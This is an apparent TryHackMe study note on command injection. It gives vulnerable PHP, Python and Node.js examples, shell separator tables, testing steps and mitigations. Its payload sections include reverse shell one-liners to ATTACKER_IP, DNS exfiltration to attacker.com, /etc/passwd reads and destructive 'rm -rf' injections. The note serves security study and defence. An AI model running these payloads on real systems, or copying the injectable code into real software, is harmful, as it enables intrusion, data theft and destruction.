# Command Injection - Quick Reference Guide

**Date:** January 14, 2026  
**Source:** TryHackMe Lab Work  
**Purpose:** Quick reference for identifying, testing, and exploiting command injection vulnerabilities

---

## What is Command Injection?

**Command Injection** = An attacker injects arbitrary system commands into an application.

**How it works:**
```
User Input: "example.com; rm -rf /"
Application: ping example.com; rm -rf /
Result: Pings example.com, THEN deletes entire filesystem!
```

The application concatenates user input directly into a system command without sanitization.

---

## Command Injection vs. SQL Injection

| Aspect | Command Injection | SQL Injection |
|--------|------------------|---------------|
| **Target** | Shell commands | Database queries |
| **Risk** | Full system compromise | Database compromise |
| **Example** | `ping $(whoami)` | `' OR '1'='1` |
| **Impact** | Remote Code Execution (RCE) | Data theft/modification |

---

## Vulnerable Code Examples

### PHP (Vulnerable)
```php
<?php
$ip = $_GET['ip'];
$output = shell_exec("ping -c 1 $ip");  // VULNERABLE!
echo $output;
?>
```

**Attack:** `http://target.com/?ip=8.8.8.8; whoami`

### Python (Vulnerable)
```python
import os
user_input = input("Enter IP: ")
os.system(f"ping -c 1 {user_input}")  # VULNERABLE!
```

**Attack:** `8.8.8.8; cat /etc/passwd`

### Node.js (Vulnerable)
```javascript
const exec = require('child_process').exec;
app.get('/ping', (req, res) => {
    exec(`ping -c 1 ${req.query.ip}`, (err, output) => {
        res.send(output);
    });
});
```

**Attack:** `?ip=8.8.8.8; id`

---

## Command Injection - Common Separators

These characters separate commands in shells:

| Separator | Behavior | Example |
|-----------|----------|---------|
| `;` | Execute next command regardless | `ping 8.8.8.8; whoami` |
| `\|` | Pipe output to next command | `ping 8.8.8.8 \| grep PING` |
| `\|\|` | Execute if previous fails | `false \|\| whoami` |
| `&&` | Execute if previous succeeds | `ping 8.8.8.8 && whoami` |
| `` ` `` | Command substitution | `` `whoami` `` |
| `$()` | Command substitution (modern) | `$(whoami)` |
| `&` | Execute in background | `ping 8.8.8.8 & whoami` |
| `newline` | Execute on new line | `ping 8.8.8.8\nwhoami` |

---

## Testing Command Injection

### Step 1: Identify Injection Points
Look for:
- Search boxes
- File upload functionality
- User input passed to system commands
- URL parameters
- Form fields

### Step 2: Test with Separators
```bash
# Test with semicolon
payload: test.com; whoami

# Test with pipes
payload: test.com | id

# Test with command substitution
payload: $(whoami)

# Test with backticks
payload: `id`
```

### Step 3: Verify Code Execution
```bash
# Simple verification
payload: ; echo vulnerable

# Verify with output
payload: ; whoami

# Time-based verification (if no output visible)
payload: ; sleep 5
```

---

## Command Injection Payloads

### Information Gathering
```bash
whoami           # Current user
id               # User ID and groups
pwd              # Current directory
ls -la           # List files
cat /etc/passwd  # Read password file
uname -a         # System information
hostname         # Machine name
```

### Network Reconnaissance
```bash
ifconfig         # Network config
ip addr          # IP addresses
netstat -tuln    # Open ports
ss -tuln         # Socket statistics
ping 8.8.8.8     # Test connectivity
nslookup         # DNS lookup
```

### Reverse Shell Payloads
```bash
# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat reverse shell
nc -e /bin/sh ATTACKER_IP PORT

# PHP reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## URL Encoding for Command Injection

When injecting via URL, use proper encoding:

| Character | URL Encoded |
|-----------|-------------|
| `;` | `%3B` |
| `\|` | `%7C` |
| `&` | `%26` |
| `$` | `%24` |
| `` ` `` | `%60` |
| `(` | `%28` |
| `)` | `%29` |
| ` ` (space) | `%20` or `+` |

**Example:**
```
Original: 8.8.8.8; whoami
URL Encoded: 8.8.8.8%3Bwhoami
```

---

## Command Injection Techniques

### Technique 1: Direct Injection
```
User Input: 8.8.8.8; cat /etc/passwd
Command: ping 8.8.8.8; cat /etc/passwd
Result: Pings, then displays /etc/passwd
```

### Technique 2: Command Substitution
```
User Input: $(whoami)
Command: ping $(whoami)
Result: Resolves whoami first, then pings that output
```

### Technique 3: Piping
```
User Input: 8.8.8.8 | grep PING
Command: ping 8.8.8.8 | grep PING
Result: Pipes ping output to grep filter
```

### Technique 4: Logical Operators
```
User Input: invalid_command || whoami
Command: ping invalid_command || whoami
Result: whoami executes because ping fails
```

---

## Blind Command Injection

When there's no visible output:

### Time-based Testing
```bash
# Inject sleep command
payload: ; sleep 5

# If page takes 5+ seconds to load, injection works
```

### Out-of-band Testing
```bash
# DNS exfiltration
payload: ; nslookup $(whoami).attacker.com

# Check DNS logs for command output
```

### File-based Testing
```bash
# Write output to web-accessible file
payload: ; whoami > /var/www/html/output.txt

# Access http://target.com/output.txt to see results
```

---

## Burp Suite Testing for Command Injection

See **Burp_Suite_Repeater_Guide.md** for detailed steps.

Quick workflow:
1. Capture request in Burp Proxy
2. Send to Repeater
3. Modify parameter with injection payload
4. Send and observe response
5. Try different separators if first fails
6. Document working payloads

---

## Mitigation Strategies

### For Developers:

✅ **NEVER use shell execution with user input**
```python
# DANGEROUS
os.system(f"ping {user_input}")

# SAFE
subprocess.run(["ping", "-c", "1", user_input], check=True)
```

✅ **Use allowlists (whitelist approach)**
```python
allowed_ips = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
if user_input in allowed_ips:
    subprocess.run(["ping", "-c", "1", user_input])
```

✅ **Use parameterized/safe APIs**
```python
# Good: Use parameterized execution
subprocess.run(["command", "argument1", "argument2"])

# Bad: Shell interpolation
os.system(f"command {argument1} {argument2}")
```

✅ **Input validation**
```python
import re
if not re.match(r'^[0-9.]+$', user_input):
    raise ValueError("Invalid IP format")
```

✅ **Run with minimal privileges**
```bash
# Create dedicated user with limited permissions
useradd -r -s /bin/false limited_user
chown limited_user:limited_user /var/www/app
```

---

## Real-World Examples

### Example 1: Vulnerable Web App
```
URL: http://target.com/ping?ip=8.8.8.8
Response: Pings 8.8.8.8 successfully

Attack:
URL: http://target.com/ping?ip=8.8.8.8;whoami
Response: Ping output + username "www-data"
```

### Example 2: File Upload
```
Upload function: convert image.jpg -resize 100x100 image_small.jpg
Attack: Filename = "image.jpg; rm -rf /tmp; #"
Result: Command becomes: convert image.jpg; rm -rf /tmp; # ...
Files deleted!
```

### Example 3: Email Function
```
Email parameter: user@example.com
Vulnerable code: mail -s "Hello" $email
Attack: user@example.com; whoami #
Result: whoami executes, output sent in email
```

---

## Key Takeaways

✅ **Command Injection** = RCE via unsanitized command execution
✅ **Separators** = `;`, `|`, `&&`, `||`, `` ` ``, `$()`
✅ **Testing** = Try each separator, use time-based if no output
✅ **Payloads** = whoami, id, ls, cat, bash reverse shells
✅ **Defense** = Never use shell execution, use subprocess with arrays, allowlists
✅ **Tools** = Burp Repeater for interactive testing

---

## Next Steps

- Practice injecting various payloads in Burp
- Test time-based and out-of-band techniques
- Build reverse shell one-liners
- Document vulnerabilities for writeups

